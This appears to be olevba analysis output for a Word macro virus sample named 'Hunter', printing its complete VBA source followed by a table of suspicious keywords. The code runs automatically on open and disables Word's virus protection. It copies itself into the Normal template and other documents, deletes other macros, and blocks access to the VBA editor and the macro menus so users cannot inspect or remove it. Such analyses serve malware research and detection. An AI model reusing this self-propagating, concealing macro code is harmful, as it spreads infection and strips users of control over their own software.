olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Hunter-0e09502f143b49d3f62acbea07f79de649c348ca
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Hunter-0e09502f143b49d3f62acbea07f79de649c348ca - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Hunter.bas 
in file: Virus.MSWord.Hunter-0e09502f143b49d3f62acbea07f79de649c348ca - OLE stream: 'Macros/VBA/Hunter'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public nomearq As String
Public nomemod As String
Public frase As String
Public frase1 As String
'Este vírusantivírus foi criado por ¥@®
Sub AutoOpen()
    antiv
    multi
    TimeT
End Sub
Sub antiv()
On Error Resume Next
Dim i As Integer
Dim mensagem, botao, titulo
    i = NormalTemplate.VBProject.VBComponents.Count
Do While NormalTemplate.VBProject.VBComponents.Count > 0
    If NormalTemplate.VBProject.VBComponents(i).Name = "Hunter" Then GoTo Salto
    If NormalTemplate.VBProject.VBComponents(i).Name = "ThisDocument" Then GoTo Salto
        frase1 = " que foi removido pelo Hunter ."
        frase = " possuia o módulo "
        nomearq = NormalTemplate.FullName
        nomemod = NormalTemplate.VBProject.VBComponents(i).Name
        mensagem = "Voçe Possui o Macro " + NormalTemplate.VBProject.VBComponents(i).Name + " em seu arquivo " + NormalTemplate.FullName + " ." + Chr(13) + Chr(13) + "Macros desse tipo pode conter vírus . . ." + Chr(13) + Chr(13) + "Deseja remover o macro . É aconselhavel . . ."
        botao = vbYesNo
        titulo = "Hunter"
        resp = MsgBox(mensagem, botao, titulo)
    If resp = vbYes Then
        Application.OrganizerDelete NormalTemplate.FullName, NormalTemplate.VBProject.VBComponents(i).Name, wdOrganizerObjectProjectItems
        arqlog
    Else
        mensagem = "Tem Certeza ??? " + Chr(13) + Chr(13) + "Alguns VÍRUS podem danificar este computador !!!" + Chr(13) + Chr(13) + "Clique 'Sim' para remover o " + NormalTemplate.VBProject.VBComponents(i).Name + " e 'Não' para manter o macro ."
        botao = vbYesNo
        titulo = "Hunter"
        resp = MsgBox(mensagem, botao, titulo)
    If resp = vbYes Then
        Application.OrganizerDelete NormalTemplate.FullName, NormalTemplate.VBProject.VBComponents(i).Name, wdOrganizerObjectProjectItems
        arqlog
    End If
    End If

Salto:
    i = i - 1
    If i < 1 Then Exit Do
Loop
    kk = ActiveDocument.VBProject.VBComponents.Count
Do While ActiveDocument.VBProject.VBComponents.Count > 0
    If ActiveDocument.VBProject.VBComponents(kk).Name = "Hunter" Then GoTo Salto1
    If ActiveDocument.VBProject.VBComponents(kk).Name = "ThisDocument" Then GoTo Salto1
        frase1 = " que foi removido pelo Hunter ."
        frase = " possuia o módulo "
        nomearq = ActiveDocument.FullName
        nomemod = ActiveDocument.VBProject.VBComponents(kk).Name
        mensagem = "Voçe Possui o Macro " + ActiveDocument.VBProject.VBComponents(kk).Name + " em seu arquivo " + ActiveDocument.FullName + " ." + Chr(13) + Chr(13) + "Macros desse tipo pode conter vírus . . ." + Chr(13) + Chr(13) + "Deseja remover o macro . É aconselhavel . . ."
        botao = vbYesNo
        titulo = "Hunter"
        resp = MsgBox(mensagem, botao, titulo)
    If resp = vbYes Then
        Application.OrganizerDelete ActiveDocument.FullName, ActiveDocument.VBProject.VBComponents(kk).Name, wdOrganizerObjectProjectItems
        arqlog
    Else
        mensagem = "Tem Certeza ??? " + Chr(13) + Chr(13) + "Alguns VÍRUS podem danificar este computador !!!" + Chr(13) + Chr(13) + "Clique 'Sim' para remover o " + ActiveDocument.VBProject.VBComponents(kk).Name + " e 'Não' para manter o macro ."
        botao = vbYesNo
        titulo = "Hunter"
        resp = MsgBox(mensagem, botao, titulo)
    If resp = vbYes Then
        Application.OrganizerDelete ActiveDocument.FullName, ActiveDocument.VBProject.VBComponents(kk).Name, wdOrganizerObjectProjectItems
        arqlog
    End If
    End If
Salto1:
    kk = kk - 1
    If kk < 1 Then Exit Do
Loop

On Error GoTo msgarq
SetAttr "c:\msg", 0
Open "c:\msg" For Input As #1
        Do Until EOF(1)
            Input #1, MM
        Loop
    Close #1
If MM = "sim" Then
    aa = MsgBox("     Seu Word® está protegido por 'Hunter' contra Vírus de macro .O 'Hunter' é um vírus criado com a finalidade de 'CAÇAR' outros vírus ...Seria um erro não dizer isso a você . Por isso estou dando a opção de remover o 'Hunter' e sua proteção Anti-Vírus , o que , aliás , não recomendo ..." + Chr(13) + "     Para remover o 'Hunter' click em 'Cancelar' ." + Chr(13) + "     Para não exibir mais esta mensagem click em 'Não' ." + Chr(13) + "     Para Fechar esta caixa de mensagem click em 'Sim' ." + Chr(13) + "     Pode ocorrer que , mesmo após remover o 'Hunter', ele venha a novamente aparecer , pois poderá estar em outros documentos . Sendo assim , basta dar um click em 'Não' sempre que aparecer esta mensagem ." + Chr(13) + "     Será criado um arquivo de 'LOG' ( " + Application.Path + "\HUNTER_LOG.TXT ) onde estarão armazenadas as informações sobre em quais arquivos o 'Hunter' encontra-se e quais os Vírus que foram removidos por ele .", vbYesNoCancel, "Hunter")
    If aa = vbYes Then
        GoTo Fim
    ElseIf aa = vbNo Then
        SetAttr "c:\msg", 0
        Open "c:\msg" For Output As #4
        Close #4
        SetAttr "c:\msg", 1 + 2 + 4
    ElseIf aa = vbCancel Then
        Application.OrganizerDelete ActiveDocument.FullName, "Hunter", wdOrganizerObjectProjectItems
        Kill "c:\msg"
    End If
End If
GoTo Fim
msgarq:

    Open "c:\msg" For Output As #3
    Close #3
    Open "c:\msg" For Append As #4
    Print #4, "sim"
    Close #4
    SetAttr "c:\msg", 1 + 2 + 4
Fim:
End Sub
Sub multi()
On Error GoTo Finall
   Application.ScreenUpdating = False
   Application.DisplayAlerts = wdAlertsNone
   Application.EnableCancelKey = wdCancelDisabled
   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   CustomizationContext = NormalTemplate
   Set ActiveDoc = ActiveDocument
   Set GlobalDoc = NormalTemplate
   DocumentInstalled = False
   GlobalInstalled = False
   For II = 1 To ActiveDocument.VBProject.VBComponents.Count
      If ActiveDocument.VBProject.VBComponents(II).Name = "Hunter" Then
         DocumentInstalled = True
      End If
   Next
   For J = 1 To NormalTemplate.VBProject.VBComponents.Count
      If NormalTemplate.VBProject.VBComponents(J).Name = "Hunter" Then
         GlobalInstalled = True
      End If
   Next
      If DocumentInstalled = False Then
      For iii = 1 To NormalTemplate.VBProject.VBComponents.Count
         If NormalTemplate.VBProject.VBComponents.Item(iii).Name = "Hunter" Then
         Application.NormalTemplate.VBProject.VBComponents.Item(iii).Export "c:\x.bas"
         Application.ActiveDocument.VBProject.VBComponents.Import "c:\x.bas"
         frase1 = " para sua proteção ."
         frase = " possui o módulo "
         nomearq = ActiveDocument.FullName
         nomemod = "Hunter"
         arqlog
         End If
      Next iii
         ActiveDocument.SaveAs ActiveDoc.FullName
      End If
      If GlobalInstalled = False Then
      For jjj = 1 To ActiveDocument.VBProject.VBComponents.Count
         If ActiveDocument.VBProject.VBComponents.Item(jjj).Name = "Hunter" Then
         Application.ActiveDocument.VBProject.VBComponents.Item(jjj).Export "c:\x.bas"
         Application.NormalTemplate.VBProject.VBComponents.Import "c:\x.bas"
         frase1 = " para sua proteção ."
         frase = " possui o módulo ."
         nomearq = NormalTemplate.FullName
         nomemod = "Hunter"
         arqlog
         End If
      Next jjj
         Options.SaveNormalPrompt = False
      End If
     Kill "c:\x.bas"
Finall:
End Sub
Sub key()
On Error Resume Next
If Application.NormalTemplate.VBProject.VBE.MainWindow.Visible = True Then
    Application.NormalTemplate.VBProject.VBE.MainWindow.Visible = False
End If
CustomizationContext = NormalTemplate
KeyBindings.Add KeyCategory:=wdKeyCategoryCommand, Command:="Msg", KeyCode:=BuildKeyCode(wdKeyAlt, wdKeyF11)
KeyBindings.Add KeyCategory:=wdKeyCategoryCommand, Command:="Msg", KeyCode:=BuildKeyCode(wdKeyAlt, wdKeyF8)
FindKey(BuildKeyCode(wdKeyControl, wdKeyPause)).Disable
CustomizationContext = ActiveDocument
KeyBindings.Add KeyCategory:=wdKeyCategoryCommand, Command:="Msg", KeyCode:=BuildKeyCode(wdKeyAlt, wdKeyF11)
KeyBindings.Add KeyCategory:=wdKeyCategoryCommand, Command:="Msg", KeyCode:=BuildKeyCode(wdKeyAlt, wdKeyF8)
FindKey(BuildKeyCode(wdKeyControl, wdKeyPause)).Disable
mnu
End Sub
Sub Msg()
MsgBox "É preciso remover a proteção ANTIVÍRUS oferecida pelo 'Hunter' antes de utilizar este serviço .", vbExclamation
End Sub
Sub arqlog()
On Error GoTo Fim
Open (Application.Path + "\HUNTER_LOG.TXT") For Append As #6
Print #6, " "
Print #6, "O arquivo " + nomearq + frase + nomemod + frase1
Close #6
Fim:
End Sub
Sub mnu()
On Error GoTo Fim
For cont = 1 To CommandBars("Macro").Controls.Count
    If CommandBars("Macro").Controls.Item(cont).Caption = "Editor do &Visual Basic" Then
    CommandBars("Macro").Controls.Item(cont).OnAction = "Msg"
    End If
Next cont
For cont1 = 1 To CommandBars("Macro").Controls.Count
    If CommandBars("Macro").Controls.Item(cont1).Caption = "&Macros..." Then
    CommandBars("Macro").Controls.Item(cont1).OnAction = "Msg"
    End If
Next cont1
For cont2 = 1 To CommandBars("Visual Basic").Controls.Count
    If CommandBars("Visual Basic").Controls.Item(cont2).Caption = "Editor do &Visual Basic" Then
    CommandBars("Visual Basic").Controls.Item(cont2).OnAction = "Msg"
    End If
Next cont2
For cont3 = 1 To CommandBars("Control Toolbox").Controls.Count
    If CommandBars("Control Toolbox").Controls.Item(cont3).Caption = "E&xibir código" Then
    CommandBars("Control Toolbox").Controls.Item(cont3).OnAction = "Msg"
    End If
Next cont3
For cont4 = 1 To CommandBars("Control Toolbox").Controls.Count
    If CommandBars("Control Toolbox").Controls.Item(cont4).Caption = "&Modo estrutura" Then
    CommandBars("Control Toolbox").Controls.Item(cont4).OnAction = "Msg"
    End If
Next cont4
Fim:
End Sub
Sub TimeT()
Application.OnTime When:=Now() + TimeValue("00:00:10"), Name:="key"
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |VBProject.VBE       |Executable file name                         |
+----------+--------------------+---------------------------------------------+

